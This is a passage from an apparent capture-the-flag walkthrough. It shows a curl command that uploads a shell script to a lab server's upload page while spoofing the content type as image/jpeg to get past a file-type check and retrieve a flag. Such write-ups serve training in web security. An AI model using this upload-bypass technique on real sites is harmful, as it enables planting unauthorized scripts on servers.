- On the "HOME" page scroll down almost to the buttom

    touch script.sh
    ```
- Using inspected submit form parameters, send the request through the curl command line utility with the appropriate IP address as follows to get the flag
    ```sh
    curl -s --form "uploaded=@script.sh;type=image/jpeg" --form Upload=Upload "http://10.12.1.129/?page=upload" | grep "flag"
    ```
